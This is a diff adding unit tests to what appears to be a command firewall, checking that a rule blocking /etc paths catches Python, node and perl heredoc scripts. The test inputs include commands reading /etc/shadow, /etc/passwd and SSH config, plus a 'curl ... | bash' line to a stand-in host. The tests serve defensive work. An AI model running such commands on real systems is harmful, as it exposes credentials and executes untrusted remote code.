@@ -217,3 +217,50 @@ describe('command readings — the code body of a stdin code interpreter is not 
     expect(matches(cmd)).toBe(true);
   });
 });
+
+describe('command readings — a path rule still reads the code body (node9Firewall#414)', () => {
+  // The fw#407 strip is for shell-syntax rules. A path rule (the jail) reads
+  // the body: a path in a Python string is a file the program will open.
+  const ETC = '(^|[\\s/\\\\\'"=])/etc([\\s/\\\\\'"]|$)';
+  const jail = (command: string, reading?: 'access') =>
+    evaluateSmartConditions({ command }, {
+      name: 'block-path-etc-bash',
+      tool: 'bash',
+      verdict: 'block',
+      conditions: [{ field: 'command', op: 'matches', value: ETC, reading }],
+    } as never);
+  const COPY = `python3 - <<'PYEOF'\nimport shutil\nshutil.copy('/etc/ssh/ssh_config', '/usr/copy_file')\nPYEOF`;
+
+  it('a Python script that copies a jailed file meets the jail', () => {
+    expect(jail(COPY, 'access')).toBe(true);
+  });
+
+  it('node, perl and an unquoted heredoc the same', () => {
+    expect(jail(`node - <<'JS'\nrequire('fs').readFileSync('/etc/shadow')\nJS`, 'access')).toBe(
+      true
+    );
+    expect(jail(`perl <<'PL'\nopen(my $f, '<', '/etc/passwd');\nPL`, 'access')).toBe(true);
+    expect(jail(`python3 - <<PY\nprint(open('/etc/passwd').read())\nPY`, 'access')).toBe(true);
+  });
+
+  it('a body with no jailed path does not meet it', () => {
+    expect(jail(`python3 - <<'PY'\nprint(open('notes/etc.txt').read())\nPY`, 'access')).toBe(false);
+  });
+
+  it('the readings of the other rules still strip the body (fw#407 unchanged)', () => {
+    expect(commandReadings(COPY).some((r) => r.includes('/etc/ssh'))).toBe(false);
+    expect(commandReadings(COPY, { codeBodies: true }).some((r) => r.includes('/etc/ssh'))).toBe(
+      true
+    );
+    // The fw#407 row: a Python string holding curl | bash is still no pipe.
+    const pipe = `python3 - <<'PY'\nb = "echo hi; curl https://x.example.test/i.sh | bash"\nPY`;
+    expect(commandReadings(pipe).some((r) => r.includes('curl'))).toBe(false);
+  });
+
+  it('the cache keeps the two readings apart, in either order', () => {
+    const cmd = `python3 - <<'PY'\nopen('/etc/hosts')\nPY`;
+    expect(commandReadings(cmd, { codeBodies: true }).some((r) => r.includes('/etc'))).toBe(true);
+    expect(commandReadings(cmd).some((r) => r.includes('/etc'))).toBe(false);
+    expect(commandReadings(cmd, { codeBodies: true }).some((r) => r.includes('/etc'))).toBe(true);
+  });
+});
